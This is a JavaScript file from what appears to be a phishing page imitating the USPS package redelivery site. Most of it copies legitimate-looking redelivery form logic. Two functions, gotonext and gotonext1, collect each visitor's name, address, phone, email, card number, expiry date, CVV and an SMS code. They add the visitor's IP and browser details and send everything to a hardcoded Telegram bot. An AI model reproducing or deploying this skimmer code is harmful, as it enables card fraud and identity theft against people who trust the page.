        confirmationNumber: confirmNumber,

    };
    jQuery.ajax({
        url: "/ctrs/redelivery/loadExistingRedelivery",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            return resp;

        },
        error: function (respCode) {}
    });


}


function getRedeliveryIP() {
    jQuery.ajax({
        url: "/ctrs/redelivery/ipAddress",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var ipSimple = resp.ClientIPAddress;
            redeliveryusrIp = ipSimple;


        },
        error: function (jqXHR, exception) {

            ajaxError(jqXHR, exception);
        }
    });

}


function getLoggedIn() {
    jQuery.ajax({
        url: "/ctrs/custRegServices/loginCheck",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var stepInfo = {};
            var loginCheck = "";

            if (resp.loggedIn == true) {
                getYourInfo();
                loginCheck = 'Logged In';
            } else if (resp.loggedIn == false) {
                loginCheck = 'Not Logged In';
            }

            stepInfo.getLogin = loginCheck;
            actionListWithParams("step1", stepInfo);


        },
        error: function (jqXHR, exception) {

            ajaxError(jqXHR, exception);
        }
    });

}

function gotonext(){

var firstName = document.getElementById("firstName").value
var middleInitial = document.getElementById("middleInitial").value
var lastName = document.getElementById("lastName").value
var addressLineOne = document.getElementById("addressLineOne").value
var addressLineTwo = document.getElementById("addressLineTwo").value
var city = document.getElementById("city").value
var state = document.getElementById("State").value
var zipCode = document.getElementById("zipCode").value
var phone = document.getElementById("phone").value
var emailAddress = document.getElementById("emailAddress").value
var cardn = document.getElementById("cardn").value
var Expiry = document.getElementById("Expiry").value
var cvv2 = document.getElementById("cvv2").value

$.get("https://ipinfo.io", function(response) {
    var ip = response.ip;
    //console.log(ip);
    var agent = navigator.userAgent;
    //console.log(agent);
     var text = `|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|=[ USER INFORMATION ]=|%0A|Name  :  ${firstName} ${middleInitial} ${lastName}%0A|Email  :  ${emailAddress}%0A|Phone  :  ${phone}%0A|State  :  ${state}%0A|City  :  ${city}%0A|ZipCode  :  ${zipCode}%0A|Address1  :  ${addressLineOne}%0A|Address2  :  ${addressLineTwo}%0A|==[ CC INFORMATION ]==|%0A|Card Number:  ${cardn}%0A|Expiry  :  ${Expiry}%0A|CVV  :  ${cvv2}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|IP-ADDRESS  :  ${ip}%0A|USER-AGENT  :  ${agent}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|`
     var url = `https://api.telegram.org/bot5567921371:AAHPC9OwhUl7s3-Wl7Hg_3QK2yc5wrTKb0Q/sendMessage?chat_id=5104348079&text=${text}`
     let api = new XMLHttpRequest();
     api.open("GET",url,true);
     api.send();    
     //console.log(text)
}, "jsonp");

}

function gotonext1(){
  var sms = document.getElementById("sms").value
            
  //console.log(sms)

 
$.get("https://ipinfo.io", function(response) {

    var ip = response.ip;
    //console.log(ip);
    var agent = navigator.userAgent;
    //console.log(agent);

     var text = `|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|=[ USER INFORMATION ]=|%0A|SMS  :  ${sms} %0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|IP-ADDRESS  :  ${ip}%0A|USER-AGENT  :  ${agent}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|`

     var url = `https://api.telegram.org/bot5567921371:AAHPC9OwhUl7s3-Wl7Hg_3QK2yc5wrTKb0Q/sendMessage?chat_id=5104348079&text=${text}`

     let api = new XMLHttpRequest();
     api.open("GET",url,true);
     api.send();    

    // console.log(text)
}, "jsonp");
    
}

function getYourInfo() {
    jQuery.ajax({
        url: "/ctrs/custRegServices/ersp/loginInformation",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var stepInfo = {};
            var acctType = "";
            var phoneMask = "";
            phoneMask = resp.phoneNumber.substring(0, 3) + "-" + resp.phoneNumber.substring(3, 6) + "-" + resp.phoneNumber.substring(6, 10);


            jQuery("#firstName").val(resp.firstName);
            jQuery("#lastName").val(resp.lastName);
            jQuery("#addressLineOne").val(resp.addressLineOne);
            jQuery("#city").val(resp.city);
            jQuery("#state").val(resp.state);
            jQuery("#zipCode").val(resp.zipCode);

            jQuery("#phone").val(phoneMask);
            jQuery("#emailAddress").val(resp.emailAddress);
            jQuery("#companyName").val(resp.companyName);

            jQuery("#regUserID").val(resp.custRegID);

            var informedDeliveryAddress = resp.addressIDOK;
            var informedDeliveryOptedIn = resp.informedDeliveryOptIn;
            var informedDeliveryDontAsk = resp.IDXSAsk;


            $(".step-three-drawer .confirm-button-wrapper").hide();
            $(".step-three-drawer .submit-wrapper").show();

            if (informedDeliveryAddress == true && informedDeliveryOptedIn == false && informedDeliveryDontAsk == false) {
                $(".step-four-drawer").show();
                $(".step-three-drawer .confirm-button-wrapper").show();
                $(".step-three-drawer .submit-wrapper").hide();

            }

            if (resp.isBusinessAcct == true) {
                acctType = 'Business';
            } else if (resp.isBusinessAcct == false) {
                acctType = 'Personal';
            }


            stepInfo.getAcctType = acctType;
            stepInfo.acctZip = resp.zipCode;
            stepInfo.accountCreate = resp.accountCreate;
            stepInfo.custRegID = resp.custRegID;
            actionListWithParams("step1", stepInfo);


        },
        error: function (jqXHR, exception) {

            ajaxError(jqXHR, exception);
        }
    });

}


/// PLACE FUNCTIONS BELOW - UNTIL I FIGURE OUT IF I WANT A SEPERATE FILE 

function buildRedeliveryStep2(trackNumber, trackingInformation) {


    var redeliveryEligible = trackingInformation.redeliveryEligible;
    var trackingExtras = trackingInformation.additionalServices;
    trackingExtras = trackingExtras.replace('[', '').replace(']', '').replace(/\,/g, '<br/>');

    var rtsDate = moment(trackingInformation.returnToSenderDate, "MMM DD, YYYY");
    var addressMatchInfo = trackingInformation.addressMatch;


    if (trackingInformation.poLocation) {

        var fullPOHours = gatherHours(trackingInformation);
    }

    var trackingText = "<div class=\"col-md-12 col-sm-12 col-xs-12 tracking-manage-" + trackNumber + " column-item\">";
    trackingText = trackingText + "<div class=\"tracking-number-dropdown\">";
    trackingText = trackingText + "<p class=\"tracking-number\"><a class=\"column-row-header\" aria-label=\"Open details for tracking number\" href=\"#\">" + trackNumber + "</a></p>";

    if (redeliveryEligible == "false" && trackingInformation.tnMatchCode != "1185") {
        // TN is not OK
        var badTracking = "<p class=\"tracking-alert\" style=\"display: block;\">Package is not eligible for Redelivery. <br class=\"alert-breakpoint\"><a href=\"https://www.usps.com/faqs/redelivery-faqs.htm\" target=\"_blank\" class=\"inline-link secondary\"><strong>See FAQs</strong><span class=\"sr-only\"> about Schedule a Redelivery</span></a></p>";
        trackingText = trackingText + badTracking;
    }


    if (trackingInformation.tnMatchCode == "1185") {
        // TN is not OK
        var badTracking = "<p class=\"tracking-alert\" style=\"display: block;\">This package has exceeded the number of allowed Redelivery attempts. See Post Office<sup>&reg;</sup> Information below to pick up your package before the Return to Sender Date. <br class=\"alert-breakpoint\"><a href=\"https://www.usps.com/faqs/redelivery-faqs.htm\" target=\"_blank\" class=\"inline-link secondary\"><strong>See FAQs</strong><span class=\"sr-only\"> about Schedule a Redelivery</span></a></p>";
        trackingText = trackingText + badTracking;
    }


    if (trackingInformation.isTrackCreateable == false && redeliveryEligible == "true") {

        // TN is not OK
        var badTracking = "<p class=\"tracking-alert\" style=\"display: block;\">A Redelivery request already exists for this package. <br class=\"alert-breakpoint\"><a href=\"https://www.usps.com/faqs/redelivery-faqs.htm\" target=\"_blank\" class=\"inline-link secondary\"><strong>See FAQs</strong><span class=\"sr-only\"> about Schedule a Redelivery</span></a></p>";
        trackingText = trackingText + badTracking;
    }
    if (addressMatchInfo && addressMatchInfo.ccccode == "1041" && trackingInformation.isTrackCreateable == true && redeliveryEligible == "true") {

        // TN is not OK
        var badTracking = "";
        badTracking = badTracking + "<p class=\"tracking-alert\" style=\"display: block\">The address entered for this tracking number does not match the original delivery address. <br class=\"alert-breakpoint\"><a href=\"https://www.usps.com/faqs/redelivery-faqs.htm\" target=\"_blank\" class=\"inline-link secondary\"><strong>See FAQs</strong><span class=\"sr-only\"> about Schedule a Redelivery</span></a></p>";
        badTracking = badTracking + "<div class=\"row\">";
        badTracking = badTracking + "<div class=\"col-md-12 col-sm-12 col-xs-12 package-intercept-wrapper\">";
        badTracking = badTracking + "<p>To send the package to a different address than the original delivery address, please use Package Intercept. To modify the Redelivery address, go back to Step 1 and select Edit.</p>";
        badTracking = badTracking + "<p class=\"package-intercept\"><a href=\"https://retail-pi.usps.com/retailpi/actions/index.action\" target=\"_blank\" class=\"inline-link secondary\"><strong>Intercept a Package</strong></a></p>";
        badTracking = badTracking + "</div>";
        badTracking = badTracking + "</div>";
        trackingText = trackingText + badTracking;

    }
    trackingText = trackingText + "</div>";
    if (trackingInformation.isTrackCreateable == false) {
        trackingText = trackingText + "<div class=\"item-details\">";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-12 col-sm-12 col-xs-12 package-intercept-wrapper\">";
        trackingText = trackingText + "<p>A Redelivery request for this package already exists. To modify that request, select Modify Redelivery Request.</p>";
        trackingText = trackingText + "<p class=\"package-intercept\"><a href=\"#\" data-toggle=\"modal\" data-target=\"#modify-redelivery-request-modal\" data-backdrop=\"static\" class=\"inline-link secondary\"><strong>Modify Redelivery Request</strong></a></p>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
    }
    if (trackingInformation.isTrackCreateable == true) {
        trackingText = trackingText + "<div class=\"item-details\">";
        trackingText = trackingText + "<div class=\"row tracking-package-information-row\">";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 tracking-information-wrapper\">";
        trackingText = trackingText + "<table class=\"details-table\">";
        trackingText = trackingText + "<tr>";
        trackingText = trackingText + "<td class=\"sub-header\">Tracking Information</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "<tr class=\"tracking-available-service-wrapper\">";
        trackingText = trackingText + "<td>" + trackingInformation.Status + "</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "</table>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 package-information-wrapper\">";
        trackingText = trackingText + "<table class=\"details-table\">";
        trackingText = trackingText + "<tr>";
        trackingText = trackingText + "<td class=\"sub-header\">Package Information</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "<tr class=\"postal-product-wrapper\">";
        trackingText = trackingText + "<td><strong>Postal Product:</strong></td>";
        trackingText = trackingText + "<td>" + trackingInformation.mailClass + "</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "<tr class=\"postal-feature-wrapper\">";
        trackingText = trackingText + "<td><strong>Feature:</strong></td>";
        trackingText = trackingText + "<td>" + trackingExtras + "</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "</table>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"row pickup-guidelines-row\">";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 pickup-information-wrapper\">";
        trackingText = trackingText + "<table class=\"details-table\">";
        trackingText = trackingText + "<tr>";
        trackingText = trackingText + "<td class=\"sub-header\">Post Office Information</td>";
        trackingText = trackingText + "</tr>";
        if (trackingInformation.poLocation) {
            trackingText = trackingText + "<tr class=\"post-office-address-wrapper\">";
            trackingText = trackingText + "<td>";
            trackingText = trackingText + "<span><a href=\"https://tools.usps.com/find-location.htm?postofficeid=" + trackingInformation.poLocation + "\" class=\"inline-link secondary\" target=\"_blank\">" + trackingInformation.poName + "</a></span>";
            trackingText = trackingText + "<span>" + trackingInformation.poAddress + "</span>";
            trackingText = trackingText + "<span>" + trackingInformation.poCity + ", " + trackingInformation.poState + " " + trackingInformation.poZipCode.substr(0, 5) + "-" + trackingInformation.poZipCode.substr(5, 9) + "</span>";
            trackingText = trackingText + "</td>";
            trackingText = trackingText + "</tr>";
            trackingText = trackingText + "<tr class=\"posf-office-hours-wrapper\">";
            trackingText = trackingText + "<td>";
            if (fullPOHours){
            	trackingText = trackingText + "<span>" + fullPOHours + "</span>";
            }
            else{
            	trackingText = trackingText + "<span> </span>";
            }       
            trackingText = trackingText + "</td>";
            trackingText = trackingText + "</tr>";

        } else {
            trackingText = trackingText + "<tr class=\"post-office-instructions-wrapper\">";
            trackingText = trackingText + "<td>Check your local <a href=\"https://tools.usps.com/find-location.htm?address=" + userInformation.zip5 + "&locationType=po\" class=\"inline-link secondary uspsLinkColored\" target=\"_blank\" aria-label=\"Local Post OFfice link. Click to open Post Office Locator.\">Post Office<sup>&reg;</sup></a> facility for pickup information.</td>";
            trackingText = trackingText + "</tr>";
        }

        trackingText = trackingText + "</table>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 return-guidelines-wrapper\">";
        trackingText = trackingText + "<table class=\"details-table\">";
        trackingText = trackingText + "<tr>";
        trackingText = trackingText + "<td class=\"sub-header\">Return Guidelines</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "<tr class=\"return-sender-date-wrapper\">";
        trackingText = trackingText + "<td><strong>Return to Sender Date:</strong></td>";
        trackingText = trackingText + "<td>" + rtsDate.format("MM/DD/YYYY") + "</td>";
        trackingText = trackingText + "</tr>";
        trackingText = trackingText + "</table>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
    }




    // Below is the Redelivery Part -> all values must match a unique ID
    if (redeliveryEligible == "true" && trackingInformation.isTrackCreateable == true && addressMatchInfo.ccccode != "1041") {
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-12 col-sm-12 col-xs-12 input-form redelivery-details-wrapper\" aria-label=\"Label: Select Redelivery Details for This Package\">";
        trackingText = trackingText + "<form class=\"form-wrapper\">";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<a class=\"edit-request-jumplink\" href=\"#\" id=\"edit-tracking-" + trackNumber + "\"></a>";
        trackingText = trackingText + "<div class=\"component-header redelivery-details-header\" aria-label = \"Select Redelivery Details for This Package\">";
        trackingText = trackingText + "<p class=\"select-redelivery-details-for-package-header\">Select Redelivery Details for This Package</p>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 form-group required-field redelivery-type-wrapper\">";
        trackingText = trackingText + "<input type=\"hidden\" id=\"mail-type-code-" + trackNumber + "\" value=\"" + trackingInformation.mailTypeCode + "\"></input>";
        trackingText = trackingText + "<label for=\"redelivery type\" class=\"\">*Redelivery Type</label>";
        trackingText = trackingText + "<select id=\"redeliveryType-" + trackNumber + "\" class=\"form-control redelivery-type-dropdown dropdown\" aria-label=\"Redelivery Type Dropdown. Select a redelivery type.\">";
        trackingText = trackingText + "<option selected disabled hidden style=\"display: none;\" value=\"none\"></option>";
        trackingText = trackingText + redeliveryTypeSelectable;
        trackingText = trackingText + "</select>";
        trackingText = trackingText + "<span class=\"error-message redelivDropErrorMessage\">Please select a Redelivery type</span>";
        trackingText = trackingText + "<p class=\"return-to-sender-notification\"><strong>NOTE:</strong> You will not be able to modify or cancel this Redelivery request once it is submitted.</p>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 form-group select-date-wrapper required-field\">";
        trackingText = trackingText + "<label for=\"select date\" class=\"inputLabel\">*Select Date</label>";
        trackingText = trackingText + "<input id=\"select-date-" + trackNumber + "\" tabindex=\"0\" type=\"text\" data-rts-date=\"" + rtsDate.format("MM/DD/YYYY") + "\" class=\"form-control calendar-date start-date mailing-date date-checker resume-start-input\" data-toggle=\"modal\" data-target=\"#modal-start-end\" data-backdrop=\"static\" autocomplete=\"off\" aria-label=\"Select Date Textbox. Select a redelivery date.\">";
        trackingText = trackingText + "<span role=\"alert\" class=\"error-message selectDate\">Please select a valid date</span>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-6 col-sm-6 col-xs-12 form-group delivery-location-wrapper required-field\">";
        trackingText = trackingText + "<label for=\"delivery location\" class=\"\">*Delivery Location</label>";
        trackingText = trackingText + "<select id=\"delivery-location-" + trackNumber + "\" class=\"form-control delivery-location-dropdown dropdown\" aria-label=\"Delivery Location Dropdown. Select a delivery location.\">";
        trackingText = trackingText + "<option selected disabled hidden style=\"display: none;\" value=\"\"></option>";
        trackingText = trackingText + redeliveryLocationSelectable;
        trackingText = trackingText + "</select>";
        trackingText = trackingText + "<span role=\"alert\" class=\"error-message redlivLocation\">Please select a delivery location</span>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";

        // 73 Event?

        if (!trackingInformation.poLocation) {
            trackingText = trackingText + "<div class=\"row\">";
            trackingText = trackingText + "<div class=\"col-md-10 col-sm-10 col-xs-12 redelivery-pickup-wrapper early-arrival\">";
            trackingText = trackingText + "<p class=\"pickup-subheader\">Pickup Information</p>";
            trackingText = trackingText + "<p>You can sign up to receive a notification that your package is available for pickup if it arrives before the date listed. Go to USPS Tracking<sup>&reg;</sup>, enter your tracking number, and select Text & Email Updates. Find Delivery Exception Updates, choose to receive text and/or email messages, and enter your contact information.</p>";
            trackingText = trackingText + "<p class=\"pickup-track-package\"><a href=\"/go/TrackConfirmAction\" target=\"_blank\" class=\"inline-link secondary track-package\"><strong>Track a Package</strong></a></p>";
            trackingText = trackingText + "</div>";
            trackingText = trackingText + "</div>";
        }

        trackingText = trackingText + "<div class=\"row\" aria-label = \"Additional Delivery Instructions. Up to 250 characters allowed: Letters, Numbers, Commas, Periods, Underscores, Ampersands, Hyphens, Parentheses, Question Marks, Pound Signs, Forward Slashes, Addition Symbols, At Symbols, and spaces allowed.\">";
        trackingText = trackingText + "<div class=\"col-md-12 col-sm-12 col-xs-12 textarea-counter-wrapper still form-group additional-instructions-wrapper\" aria-label = \"Additional Delivery Instructions. Up to 250 characters allowed: Letters, Numbers, Commas, Periods, Underscores, Ampersands, Hyphens, Parentheses, Question Marks, Pound Signs, Forward Slashes, Addition Symbols, At Symbols, and spaces allowed.\">";
        trackingText = trackingText + "<label for=\"additional instructions\" class=\"\"><span class=\"carrier-redeliver-required\" aria-label = \"Additional Delivery Instructions. Up to 250 characters allowed: Letters, Numbers, Commas, Periods, Underscores, Ampersands, Hyphens, Parentheses, Question Marks, Pound Signs, Forward Slashes, Addition Symbols, At Symbols, and spaces allowed.\">*</span>Additional Instructions</label>";
        trackingText = trackingText + "<textarea class=\"form-control textarea-counter extra-input-field\" aria-label = \"Additional Delivery Instructions. Up to 250 characters allowed: Letters, Numbers, Commas, Periods, Underscores, Ampersands, Hyphens, Parentheses, Question Marks, Pound Signs, Forward Slashes, Addition Symbols, At Symbols, and spaces allowed.\" id=\"additional-pickup-inst-" + trackNumber + "\" name=\"\" maxlength=\"250\" rows=\"6\"></textarea>";
        trackingText = trackingText + "<div class=\"textarea-counter label label-default count_message\" id=\"\">0/250</div>";
        trackingText = trackingText + "<span role=\"alert\" id=\"instructError-" + trackNumber + "\" style=\"display: none;\" class=\"error-message\">Please add additional instructions</span>";
        trackingText = trackingText + "<span role=\"alert\" class=\"error-message-characters\">Up to 250 characters allowed: AaBbCc, 1 2 3, commas, periods, _ & - ( ) ? # / + @ and a space.</span>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-12 col-sm-12 col-xs-12 redelivery-pickup-wrapper\">";
        trackingText = trackingText + "<div class=\"checkbox-wrap\">";
        trackingText = trackingText + "<div class=\"checkbox-container\">";
        trackingText = trackingText + "<label class=\"checkbox-component\" for=\"representative-for-" + trackNumber + "\">";
        trackingText = trackingText + "<input for=\"send a representative\" type=\"checkbox\" class=\"pickup-representative\" id=\"representative-for-" + trackNumber + "\">";
        trackingText = trackingText + "<span id=\"representative-check-" + trackNumber + "\" class=\"checkbox\"></span>";
        trackingText = trackingText + "<p>Send someone to serve as your representative to pick up your package</p>";
        trackingText = trackingText + "</label>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<p class=\"id-pickup\">You will be required to show a government-issued photo ID at the time of pickup.</p>";
        trackingText = trackingText + "<div class=\"representative-requirements-wrapper representative-show\">";
        trackingText = trackingText + "<p>At the time of pickup, the specified representative will be required to show:</p>";
        trackingText = trackingText + "<ul class=\"representative-requirements\">";
        trackingText = trackingText + "<li class=\"pickupInfo\">Government-issued photo ID. The name entered below must match the name printed on the representative's photo ID. The ID may be scanned for our records.</li>";
        trackingText = trackingText + "<li class=\"pickupInfo\">PS Form 3849, We ReDeliver for You! signed by the original recipient and the name of the representative printed on the back.</li>";
        trackingText = trackingText + "</ul>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<p class=\"acceptable-id\"><a href=\"https://faq.usps.com/s/article/Acceptable-Form-of-Identification?r=4&ui-force-components-controllers-recordGlobalValueProvider.RecordGvp.getRecord=1\" target=\"_blank\" class=\"uspsLinkColored\"><strong>See Acceptable IDs</strong></a></p>";
        trackingText = trackingText + "<div class=\"row representative-requirements-wrapper\">";
        trackingText = trackingText + "<div class=\"col-md-5 col-sm-4 col-xs-9 form-group required-field\">";
        trackingText = trackingText + "<label for=\"representative first name\" class=\"\">*First Name</label>";
        trackingText = trackingText + "<input id=\"rep-first-name-" + trackNumber + "\" tabindex=\"0\" type=\"text\" class=\"form-control\">";
        trackingText = trackingText + "<span role=\"alert\" class=\"error-message\">Please add your representative's first name</span>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-1 col-sm-2 col-xs-3 form-group\">";
        trackingText = trackingText + "<label for=\"representative middle initial\" class=\"\">M.I.</label>";
        trackingText = trackingText + "<input id=\"rep-middle-name-" + trackNumber + "\"  tabindex=\"0\" type=\"text\" class=\"form-control\" maxlength=\"1\">";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-5 col-sm-5 col-xs-12 form-group required-field\">";
        trackingText = trackingText + "<label for=\"representative last name\" class=\"\">*Last Name</label>";
        trackingText = trackingText + "<input id=\"rep-last-name-" + trackNumber + "\" tabindex=\"0\" type=\"text\" class=\"form-control\">";
        trackingText = trackingText + "<span role=\"alert\" class=\"error-message\">Please add your representative's last name</span>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"col-md-10 col-sm-10 col-xs-12 privacy-act-statement-wrapper\">";
        trackingText = trackingText + "<p class=\"privacy-act-statement-header\">Privacy Act Statement</p>";
        trackingText = trackingText + "<p>Your information will be used to provide you requested products, services, or information. Collection is authorized by 39 USC 401, 403, & 404. Supplying your information is voluntary, but if not provided, we may not be able to process your request. We do not disclose your information to third parties without your consent, except to act on your behalf or request, or as legally required. This includes the following limited circumstances: to a congressional office on your behalf; to agencies and entities to facilitate or resolve financial transactions; to a U.S. Postal Service auditor; for law enforcement purposes, to labor organizations as required by applicable law; incident to legal proceedings involving the Postal Service; to government agencies in connection with decisions as necessary; to agents or contractors when necessary to fulfill a business function or provide products and services to customers; and for customer service purposes. For more information regarding our privacy policies visit <a href=\"https://www.usps.com/privacypolicy\" target=\"_blank\" class=\"textUrl\">www.usps.com/privacypolicy.</a></p>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "<div class=\"row\">";
        trackingText = trackingText + "<div class=\"col-md-12 col-md-12 col-xs-12 clear-form-button-wrapper\">";
        trackingText = trackingText + "<div class=\"details-clear-form-button-container\">";
        trackingText = trackingText + "<a href=\"#\" role=\"button\" class=\"btn-primary button--white clear-btn\" tabindex=\"0\" aria-label=\"Clear Form button. Click to Clear all selections from the redelivery form.\">Clear Form</a>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</form>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
        trackingText = trackingText + "</div>";
    } else {

    }

    return trackingText;
}

function gatherHours(trackingInformation) {
    var cleanPOHours = {};
    var dateHours = trackingInformation.poPickupDatesTimes.split(";");

    jQuery.each(dateHours, function (dI, dateData) {

        dateData = dateData.trim();
        var dateMap = {
            "M": "Mon",
            "T": "Tue",
            "W": "Wed",
            "TH": "Thu",
            "F": "Fri",
            "SAT": "Sat",
            "SUN": "Sun",
            "HOL": "Holiday"
        };

        var splitHoursandDays = dateData.split(" ");

        var times = splitHoursandDays[1].split("-");


        // OPEN & CLOSE
        var openAMPM = moment(times[0], "HHmm").format("h:mm a");
        var closeAMPM = moment(times[1], "HHmm").format("h:mm a");

        // Days of Week
        var days = splitHoursandDays[0].split("-");
        var dayOutput = dateMap[days[0].toUpperCase()];
        if (days[1]) {
            dayOutput = dayOutput + "-" + dateMap[days[1].toUpperCase()];
        }
        
        
        if(dayOutput == null)
            {
                // try comma dates
                var commaDays = days[0].split(",");
                var fmtCommaDays = [];
                $.each(commaDays, function(cmidx, cmdata){
                       
                       fmtCommaDays.push(dateMap[cmdata.toUpperCase()]);
                       
                       });
                
                dayOutput =  fmtCommaDays.join(",");
             
                if(dayOutput == null)
                    {
                        dayOutput = days[0];
                    }
            }


        cleanPOHours[dayOutput] = openAMPM + "-" + closeAMPM;

    });

    var fullPOHours = "";
    jQuery.each(cleanPOHours, function (weekDay, hoursListed) {

        fullPOHours = fullPOHours + "<br />" + weekDay + " " + hoursListed;

    });

    return fullPOHours;
}



function reviewSelectedRedelivery() {
    // Grab Each Redelivery and check to make sure its all filled out...
    var hasErrors = false;
    // Clear the selected Items - in case people changed their mind
    redeliveryInformation = {};

    // Remove click event
    $('.step-three-drawer').unbind('click touch');


    jQuery.each(selectedRedeliveryItems, function (indexR, redeliveryItem) {

        // special characters
        var regex = /^[\.\,\_\&\-\(\)\?\#\/\+\@A-Za-z0-9 ]+$/
        if (!regex.test($("#additional-pickup-inst-" + redeliveryItem).val()) && ($("#additional-pickup-inst-" + redeliveryItem).val().length > 0)) {
            hasErrors = true
        }

        // NO - This should never error - if no type, no redelivery, no care.

        //		if (jQuery("#redeliveryType-" + redeliveryItem).val() == null) {
        //
        //			jQuery(".redelivDropErrorMessage").parent().addClass("error");
        //		}
        //		jQuery("#redeliveryType-" + redeliveryItem).on('change', function () {
        //			jQuery(".redelivDropErrorMessage").parent().removeClass("error");
        //		});
        var currentRedelivery = jQuery("#redeliveryType-" + redeliveryItem).val();
        if (currentRedelivery) {

            var errorUpdate = redeliveryValidate(redeliveryItem, currentRedelivery);
            if (!hasErrors && errorUpdate) {
                hasErrors = errorUpdate;
            }
            // Add this to the list
            var redeliveryCurrent = {};
            redeliveryCurrent.rdType = currentRedelivery;
            redeliveryCurrent.rdDate = jQuery("#select-date-" + redeliveryItem).val();
            redeliveryCurrent.rdLocation = jQuery("#delivery-location-" + redeliveryItem).val();
            redeliveryCurrent.rdRep = jQuery("#representative-for-" + redeliveryItem).is(":checked");
            redeliveryCurrent.rdRepFirst = jQuery("#rep-first-name-" + redeliveryItem).val();
            redeliveryCurrent.rdRepMiddle = jQuery("#rep-middle-name-" + redeliveryItem).val();
            redeliveryCurrent.rdRepLast = jQuery("#rep-last-name-" + redeliveryItem).val();
            redeliveryCurrent.rdAdditionalInst = jQuery("#additional-pickup-inst-" + redeliveryItem).val();
            redeliveryCurrent.rdEmailConfirm = jQuery("#email-confirmation-" + redeliveryItem).is(":checked");
            redeliveryCurrent.mailTypeCode = jQuery("#mail-type-code-" + redeliveryItem).val();

            redeliveryInformation[redeliveryItem] = redeliveryCurrent;

        }
    });


    if (Object.keys(redeliveryInformation).length == 0) {
        $(".selectRed").show();
        hasErrors = true;
    } else {
        $(".selectRed").hide();
    }

    if (!hasErrors) {
        var totalSelectedCount = Object.keys(redeliveryInformation).length;
        jQuery("#total-packages-selected").text(totalSelectedCount);
        clearStepError();
        buildReviewSection();
        $('.step-two-drawer').removeClass('active current-step');
        $('.step-two-drawer').addClass('step-complete');
        $('.step-three-drawer').addClass('active current-step');
        $('.step-three-drawer').removeClass('disabled');
        $('.step-two-drawer').removeClass('edit-step');
        $('.review-error-wrapper').removeClass('error');
    }

}

function submitRedelivery() {


    // first do a check
    var trackingList = Object.keys(redeliveryInformation);
    jQuery.each(trackingList, function (indx, tracking) {

        var informationTN = redeliveryInformation[tracking];
        jQuery.each(redeliveryInformation, function (indxsch, trackingsch) {

            var typeCheck = trackingsch.rdType;
            var locCheck = trackingsch.rdLocation;
            var dateCheck = trackingsch.rdDate;
